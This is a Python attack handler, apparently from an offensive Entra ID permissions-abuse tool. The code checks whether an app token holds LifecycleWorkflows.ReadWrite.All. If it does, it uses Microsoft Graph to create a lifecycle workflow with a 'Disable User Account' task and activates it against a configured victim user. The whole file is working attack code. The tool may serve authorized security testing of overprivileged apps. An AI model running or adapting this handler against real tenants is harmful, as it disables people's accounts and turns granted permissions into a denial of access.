from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
import random, string

logger = logger.createLogger('attacks.handlers.lifecycle_disable_handler')


class Lifecycle_DisableHandler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "LifecycleWorkflows.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to lifecycle_worfflows_disableword vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "LifecycleWorkflowsDisablewordVectors"
            message = ""
            error = "LifecycleWorkflowsDisablewordVectors - failed"
            conf = request.attack_config['lifecycle']
            logger.debug("LifecycleWorkflows.ReadWrite.All - Allows the app to create, update, list, read and delete all workflows, tasks and related lifecycle workflows resources without a signed-in user.")
            logger.debug("Attack vector - disable users.")
            try:
                letters = string.ascii_lowercase
                displayname =  ''.join(random.choice(letters) for i in range(15))
                create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
                message_obj = {"category":"joiner","displayName":"Onboard PermissionPanic " + displayname,"description":"Configure new PermissionPanic tasks","tasks":[{"arguments":[],"description":"Disable user account in the directory","displayName":"Disable User Account" + displayname,"isEnabled":"true","continueOnError":"false","taskDefinitionId":"1dfdfcc7-52fa-4c2e-bf3a-e3919cc12950","category":"joiner,leaver"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.triggerAndScopeBasedConditions","scope":{"@odata.type":"microsoft.graph.identityGovernance.ruleBasedSubjectSet","rule":"(department eq 'Marketing')"},"trigger":{"@odata.type":"#microsoft.graph.identityGovernance.timeBasedAttributeTrigger","offsetInDays":0,"timeBasedAttribute":"createdDateTime"}},"isEnabled":"true","isSchedulingEnabled":"true"}
                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                json = result.json()
                id = json["id"]

                if result.status_code == 201:
                    create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
                    message_obj = {"subjects": [{"id": conf["victim"]}]}
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)

                    if result.status_code == 204:
                        
                        message += "disabled user %s \n" % (conf["victim"])
                        status = True
                    
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in lifecycle_disable_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
